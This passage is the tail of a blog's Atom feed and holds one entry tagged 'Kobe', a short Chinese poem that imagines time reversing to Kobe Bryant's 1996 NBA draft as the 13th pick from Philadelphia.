    <id>http://yoursite.com/2020/01/26/%E6%97%B6%E5%85%89%E5%9B%9E%E6%BA%AF/</id>
    <published>2020-01-26T02:24:08.000Z</published>
    <updated>2020-04-02T15:55:43.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id="24-8"><a href="#24-8" class="headerlink" title="24 / 8"></a>24 / 8</h1><blockquote><p>洛杉矶的瀑布逆流而上，<br>西班牙人长发飘扬，<br>大鲨鱼还是青涩模样，<br>斯特恩回到选秀大会上，<br>来自费城的13顺位即将登场。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;24-8&quot;&gt;&lt;a href=&quot;#24-8&quot; class=&quot;headerlink&quot; title=&quot;24 / 8&quot;&gt;&lt;/a&gt;24 / 8&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;洛杉矶的瀑布逆流而上，&lt;br&gt;西班牙人长发飘扬，&lt;br&gt;大鲨鱼还是青涩模样，&lt;br&gt;斯特恩
      
    
    </summary>
    
    
    
      <category term="Kobe" scheme="http://yoursite.com/tags/Kobe/"/>
    
  </entry>
  
</feed>
